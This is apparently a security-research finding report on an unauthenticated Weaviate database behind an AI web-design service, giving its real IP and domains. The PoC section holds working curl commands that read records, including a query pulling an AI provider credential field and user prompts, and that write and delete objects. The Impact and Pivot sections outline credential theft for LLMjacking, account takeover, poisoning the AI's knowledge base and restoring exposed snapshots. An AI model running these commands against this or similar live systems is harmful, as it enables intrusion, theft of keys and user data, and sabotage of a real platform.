# WebGen AI (b123.be / igt.com.hk) -- Unauth RWD on AI Web Design Platform

**Date:** 2026-06-20
**Tool:** weavscan
**Severity:** CRITICAL
**Status:** CONFIRMED -- unauth read + write + delete

---

## Target

```
IP:       202.66.151.79
Ports:    8080  (Weaviate 1.27.2)
          [separate port -- Qdrant, 12 snapshots exposed, Cat-13 survey]
Domains:  api.b123.be (Belgian)
          igt.com.hk (Hong Kong)
Service:  Weaviate 1.27.2
Auth:     NONE
Note:     Dual vector DB exposure on same host -- Qdrant previously
          documented in Cat-13 data-at-rest survey with 12 snapshots.
```

---

## Operator Attribution

**b123.be** -- Belgian domain; **igt.com.hk** -- Hong Kong entity. Dual-domain on the same IP.

AI-powered web design/generation platform. Both domains resolve to 202.66.151.79. The schema reflects an AI web design workflow with step-level logging, design diff tracking, and reusable fix pattern storage. The presence of `ai_model_key` in WebGenStep and `source_designer_id` in DesignFixPattern confirms operator identity as an AI web generation SaaS with multiple AI provider integrations and multiple designer accounts.

---

## Data

**3 classes, ~5 objects total**

| Class | Key Properties |
|-------|---------------|
| DesignDiffPackage | run_id, html_diff_summary, css_diff_summary, selectors_touched, issue_mapping, created_at |
| DesignFixPattern | title, problem_signature, when_to_apply, fix_steps, patch_example_before, patch_example_after, css_snippet, severity, expected_score_gain, source_designer_id |
| WebGenStep | request_id, session_id, generation_type, request_payload, response_body, user_prompt, system_prompt, ai_model_key, tokens_used, latency_ms, success, page_id |

### Schema Detail: WebGenStep

```
request_id       text    -- unique per generation request
session_id       text    -- user session identifier
generation_type  text    -- type of AI generation step
request_payload  text    -- full request sent to AI model
response_body    text    -- full AI model response
user_prompt      text    -- raw user input
system_prompt    text    -- platform's system prompt (IP)
ai_model_key     text    -- AI API credential stored per record
tokens_used      int     -- token consumption per step
latency_ms       int     -- inference latency
success          boolean
page_id          text    -- design page reference
```

**ai_model_key** is schema-confirmed. Not retrieved per restraint ethic. If populated with live credentials, every WebGenStep record exposes the AI provider key used for that generation.

---

## Access Matrix

| Operation | Result | HTTP |
|-----------|--------|------|
| GET /v1/schema | Schema returned, all 3 classes | 200 |
| GET /v1/objects?class=WebGenStep | Records returned | 200 |
| GET /v1/objects?class=DesignFixPattern | Records returned | 200 |
| POST /v1/objects (DesignFixPattern) | Write accepted | 200 |
| DELETE /v1/objects/{class}/{uuid} | Delete accepted | 204 |
| GET /v1/objects/{class}/{uuid} (post-delete) | Not found | 404 |

**Canary UUID:** `3f81599b-e47e-4c15-aaec-e4450bd0fb7d`
Written to DesignFixPattern, verified deleted (404 confirmed).

---

## PoC

### Read -- Schema

```bash
curl -s http://202.66.151.79:8080/v1/schema | jq '.classes[].class'
# Returns: "DesignDiffPackage", "DesignFixPattern", "WebGenStep"
```

### Read -- WebGenStep records (ai_model_key field confirmed in schema)

```bash
curl -s "http://202.66.151.79:8080/v1/objects?class=WebGenStep&limit=5" \
  | jq '.objects[] | {session_id: .properties.session_id, ai_model_key: .properties.ai_model_key, user_prompt: .properties.user_prompt}'
```

### Write -- Canary injection

```bash
curl -s -X POST http://202.66.151.79:8080/v1/objects \
  -H "Content-Type: application/json" \
  -d '{
    "class": "DesignFixPattern",
    "id": "3f81599b-e47e-4c15-aaec-e4450bd0fb7d",
    "properties": {
      "title": "canary-nuclide-20260620",
      "problem_signature": "canary",
      "severity": "low",
      "expected_score_gain": 0
    }
  }' | jq '.id'
```

### Delete -- Canary removal

```bash
curl -s -X DELETE \
  http://202.66.151.79:8080/v1/objects/DesignFixPattern/3f81599b-e47e-4c15-aaec-e4450bd0fb7d
# HTTP 204

# Verify gone
curl -s http://202.66.151.79:8080/v1/objects/DesignFixPattern/3f81599b-e47e-4c15-aaec-e4450bd0fb7d \
  | jq '.error'
# HTTP 404
```

---

## Impact

### AI API Credential Exposure

WebGenStep.ai_model_key is a per-record field storing the AI provider credential used for each generation step. Unauth GraphQL allows full extraction of all records and all values in this field. If populated with live keys: complete API key exfiltration across all integrated AI providers (OpenAI, Anthropic, or equivalent). Each generation request that hit a different key would expose a different credential. This enables LLMjacking -- billing fraud, quota exhaustion, or pivot to the AI provider account.

### Prompt Engineering / IP Leak

WebGenStep.system_prompt and user_prompt fields expose the platform's full prompt architecture. Extracting these reveals proprietary prompt engineering, generation strategies, and any hard-coded system instructions -- complete competitive intelligence for a rival AI design tool.

### Proprietary Design Pattern Extraction

DesignFixPattern records contain AI-generated fix strategies with before/after patch examples, CSS snippets, quality delta scores (expected_score_gain), and the source_designer_id who produced them. This is the platform's core IP -- extractable in full via unauthenticated GET.

### Write / Data Poisoning

No auth required to inject arbitrary DesignFixPattern or WebGenStep records. A write operation can insert malicious fix patterns into the AI's knowledge base, causing the platform to recommend harmful CSS/HTML changes to end users' design projects.

### Dual Vector DB Attack Surface

This host previously confirmed to run Qdrant with 12 exposed snapshots (Cat-13 survey). Two separate unauth vector databases on the same operator infrastructure. Combined attack surface: Weaviate live data + Qdrant persistent snapshots. Snapshots are portable -- downloaded offline, restored to a local Qdrant instance, full historical data recovery.

---

## Pivot Avenues

1. **WebGenStep.ai_model_key** -- full field extraction reveals AI provider credentials; pivot to LLMjacking / provider account takeover
2. **b123.be** -- Belgian operator domain; check main web app, customer portal, and API documentation for additional attack surface
3. **igt.com.hk** -- Hong Kong entity on the same IP; may be parent company, reseller, or separate product line
4. **Qdrant on same host** -- already documented (Cat-13); 12 snapshots = full historical data; download and restore locally for offline analysis
5. **request_payload / response_body** -- full AI request/response pairs; expose the complete generation workflow and any user PII embedded in prompts

---

## Tool Reference

**weavscan** -- https://github.com/nuclide-research/weavscan
